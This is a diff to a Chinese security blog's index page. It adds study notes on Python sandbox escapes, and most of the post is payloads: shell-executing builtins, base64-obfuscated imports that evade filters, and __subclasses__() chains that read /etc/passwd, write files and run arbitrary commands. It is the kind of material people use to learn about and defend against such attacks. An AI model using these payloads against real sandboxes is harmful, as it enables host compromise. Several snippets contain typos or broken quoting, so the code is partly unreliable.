@@ -198,6 +198,172 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d61ff4cabe.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d61ff4cabe.html" class="post-title-link" itemprop="url">Python沙箱逃逸学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-15 12:51:44" itemprop="dateCreated datePublished" datetime="2019-08-15T12:51:44+08:00">2019-08-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:27:39" itemprop="dateModified" datetime="2020-10-14T17:27:39+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>所谓的 Python 沙盒，即以一定的方法模拟(socat) Python 终端，实现用户对 Python 的使用。</p>
+<h3 id="逃逸方法"><a href="#逃逸方法" class="headerlink" title="逃逸方法"></a>逃逸方法</h3><ul>
+<li>Python内建函数中有些函数能够执行shell命令，导致任意代码执行。</li>
+</ul>
+<pre><code class="python">  os.system() 
+  os.popen()
+  commands.getstatusoutput() 
+  commands.getoutput()
+  commands.getstatus()
+  subprocess.call(command, shell=True) 
+  subprocess.Popen(command, shell=True)
+  pty.spawn()</code></pre>
+<ul>
+<li>Python中导入模块的方法</li>
+</ul>
+<pre><code class="python">import xxx
+form xx import *
+__import__(&#39;xxx&#39;)</code></pre>
+<p>​        我们可以通过上述方法导入相关模块再调用相关函数导致命令执行。除此之外，我们也可以通过路径引入模块，例如linux系统中Python os的路径一般都是/usr/lib/python2.7/os.py,当知道路径的时候就可以通过如下操作导入操作模块。进一步调用相关函数。</p>
+<pre><code class="python">&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;
+&gt;&gt;&gt; import os
+&gt;&gt;&gt;</code></pre>
+<ul>
+<li><p>其他危险函数</p>
+<ol>
+<li>execfile文件执行</li>
+</ol>
+</li>
+</ul>
+<pre><code class="shell">&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)
+&gt;&gt;&gt; system(&#39;cat /etc/passwd&#39;)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+&gt;&gt;&gt; getcwd()
+&#39;/usr/lib/python2.7&#39;</code></pre>
+<p>​        2.timeit</p>
+<pre><code class="python">import timeit
+timeit.timit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)</code></pre>
+<p>​        3.eval和exec</p>
+<pre><code class="python">eval(&#39;__import__(&#39;os&#39;).system(&quot;dir&quot;)&#39;)</code></pre>
+<p>​        4.platform</p>
+<pre><code class="python">import platform
+print platform.popen(&#39;dir&#39;).read()</code></pre>
+<ul>
+<li>Python内建函数</li>
+</ul>
+<p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code> 来获取内置函数列表</p>
+<pre><code class="python">&gt;&gt;&gt; dir(__builtins__)
+[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, .....</code></pre>
+<p>在Python中一个模块是由字典对象实现命名空间的，例如：m.x等同于m.dic[“x”].那么我们可以直接通过<strong>dic</strong>引入我们想要的模块（其作用为列出一个模组/类对象下面的属性和函数）。</p>
+<p>绕过实例：</p>
+<pre><code class="python">&gt;&gt;&gt;__builtins__.__dict__[&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)](&#39;b3M=&#39;.decode(&#39;base64&#39;))</code></pre>
+<pre><code>&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.b64encode(&#39;__import__&#39;)
+&#39;X19pbXBvcnRfXw==&#39;
+&gt;&gt;&gt; base64.b64encode(&#39;os&#39;)
+&#39;b3M</code></pre><p><em>如果一些 内敛函数在 *</em>builtins** 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 <strong>builtins*</strong></p>
+<ul>
+<li>创建对象以及引用</li>
+</ul>
+<p>Python中的object类集成了许多基础函数，我们想要调用的时候也是可以直接创建对象进而引用。</p>
+<p>常见方法：</p>
+<pre><code class="python">().__class__.bases__[0]
+&#39;&#39;.__class__.mro__[2]
+读取文件：
+print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code></pre>
+<p>常见payload:</p>
+<pre><code class="python">#读文件
+().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()
+
+#写文件
+().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/input&#39;, &#39;w&#39;).write(&#39;123&#39;)
+
+#执行任意命令
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d42c963778.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -765,7 +931,7 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -836,12 +1002,12 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">229k</span>
+    <span title="站点总字数">231k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:30</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
